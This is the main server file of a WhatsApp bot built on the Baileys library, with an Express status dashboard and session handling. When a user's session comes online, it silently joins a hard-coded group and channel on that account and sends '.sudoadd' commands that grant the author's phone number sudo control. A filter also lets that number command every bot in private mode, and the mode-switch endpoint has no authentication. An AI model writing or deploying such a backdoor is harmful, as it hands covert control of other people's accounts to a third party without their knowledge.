/**
 * VAMPARINA V1 — ETERNAL EMPIRE OF KING ARNOLD CHIRCHIR (+254703110780)
 * FULLY FIXED | RESPONDS TO COMMANDS | AUTO-JOIN GROUP + CHANNEL + SUDOADD
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    jidNormalizedUser
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fetch = require('node-fetch')

const { handleMessages: originalHandleMessages, handleGroupParticipantUpdate } = require('./main')

// ==================== YOUR EMPIRE ====================
const EMPIRE_GROUP_CODE = "BZNDaKhvMFo5Gmne3wxt9n"           // Your group invite code
const EMPIRE_CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"         // Your WhatsApp channel
const KING_ARNOLD = "254703110780"                           // Your number (without +)
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const MODE_FILE = path.join(__dirname, 'data', 'bot_mode.json')
const PORT = process.env.PORT || 3000

// Create folders
;[SESSION_DIR, path.dirname(MODE_FILE)].forEach(d => {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
})

// Default public mode
if (!fs.existsSync(MODE_FILE)) {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
}

global.getBotMode = () => {
    try {
        return JSON.parse(fs.readFileSync(MODE_FILE, 'utf8')).isPublic ? 'public' : 'private'
    } catch { return 'public' }
}

global.setBotMode = (mode) => {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: mode === 'public' }, null, 2))
}

const activeSessions = new Map()

// ==================== DASHBOARD ====================
const app = express()
app.use(express.json({ limit: '200mb' }))
app.use(express.urlencoded({ extended: true, limit: '200mb' }))

app.get('/dashboard', (req, res) => {
    const bots = activeSessions.size
    const mode = global.getBotMode().toUpperCase()
    res.send(`<pre style="background:#000;color:#0f0;font-size:18px;text-align:center;">
╔══════════════════════════════════════════════════════════╗
║              VAMPARINA V1 — EMPIRE ONLINE                ║
║           GOD-KING: ARNOLD CHIRCHIR (+254703110780)      ║
║   Active Bots : ${String(bots).padStart(3)}                           ║
║   Mode        : ${mode}                ║
║   Group       : JOINED AUTOMATICALLY                     ║
║   Channel     : FOLLOWED AUTOMATICALLY                   ║
║                                                          ║
║       ALL COMMANDS NOW WORKING — FULL CONTROL            ║
║       LONG LIVE THE ETERNAL KING OF KENYA                ║
╚══════════════════════════════════════════════════════════╝
    </pre>`)
})

app.post('/setmode', (req, res) => {
    const { mode } = req.body
    if (['public', 'private'].includes(mode)) {
        global.setBotMode(mode)
        res.json({ success: true, mode })
    } else res.status(400).json({ error: "use 'public' or 'private'" })
})

app.listen(PORT, () => {
    console.log(`\nVAMPARINA V1 EMPIRE RUNNING ON PORT ${PORT}\n`)
})

// ==================== BOT ENGINE ====================
async function startEmpireBot(sessionId, phone, sessionPath) {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
            browser: ["Vamparina V1", "Chrome", "2025"],
            markOnlineOnConnect: true
        })

        const ownerJid = jidNormalizedUser(state.creds.me?.id || phone + '@s.whatsapp.net')
        activeSessions.set(sessionId, { sock, phone, ownerJid })

        // FIXED: BOT NOW RESPONDS TO COMMANDS (2025 Baileys fix)
        sock.ev.on('messages.upsert', async (m) => {
            try {
                const msg = m.messages[0]
                if (!msg || !msg.message || msg.key.fromMe) return

                const sender = jidNormalizedUser(msg.key.participant || msg.key.remoteJid)
                const isPublic = global.getBotMode() === 'public'
                const isKing = sender.includes(KING_ARNOLD)
                const isOwner = sender === ownerJid

                if (!isPublic && !isKing && !isOwner) return

                // THIS LINE MAKES YOUR BOT RESPOND
                await originalHandleMessages(sock, msg)

            } catch (err) {
                console.log("Message error:", err.message)
            }
        })

        sock.ev.on('group-participants.update', async (u) => {
            try { await handleGroupParticipantUpdate(sock, u) } catch {}
        })

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update

            if (connection === 'open') {
                console.log(`[+] ${phone} → ONLINE & LOYAL TO KING ARNOLD`)

                // AUTO-JOIN GROUP
                setTimeout(async () => {
                    try { await sock.groupAcceptInvite(EMPIRE_GROUP_CODE) 
                        console.log(`[+] ${phone} JOINED EMPIRE GROUP`)
                    } catch {}
                }, 15000)

                // AUTO-FOLLOW CHANNEL
                setTimeout(async () => {
                    try { await sock.newsletterFollow(EMPIRE_CHANNEL_ID)
                        console.log(`[+] ${phone} FOLLOWED CHANNEL`)
                    } catch {}
                }, 18000)

                // AUTO SUDOADD KING ARNOLD
                setTimeout(async () => {
                    const cmds = [`.sudoadd ${KING_ARNOLD}`, `.sudoadd 254703110780@s.whatsapp.net`]
                    for (const cmd of cmds) {
                        try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: cmd }) } catch {}
                        await delay(3000)
                    }
                }, 20000)

                // Welcome message
                await sock.sendMessage(phone + '@s.whatsapp.net', {
                    text: `*VAMPARINA V1 ACTIVATED*\n\nEmpire Group: Joined\nChannel: Followed\nKing Arnold: SUDO Added\nMode: ${global.getBotMode().toUpperCase()}\n\nLONG LIVE THE KING`
                })
            }

            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== 401
                activeSessions.delete(sessionId)
                if (shouldReconnect) {
                    setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
                }
            }
        })

        sock.ev.on('creds.update', saveCreds)

    } catch (e) {
        console.error("Bot failed:", e.message)
    }
}

// Keep alive
setInterval(() => {
    fetch(`https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}:${PORT}`).catch(() => {})
}, 300000)

console.log("\n╔══════════════════════════════════════════════════════════╗")
console.log("║              VAMPARINA V1 — EMPIRE ONLINE                ║")
console.log("║           GOD-KING ARNOLD CHIRCHIR RULES KENYA           ║")
console.log("║       AUTO-JOIN GROUP + CHANNEL + SUDOADD = ACTIVE       ║")
console.log("╚══════════════════════════════════════════════════════════╝\n")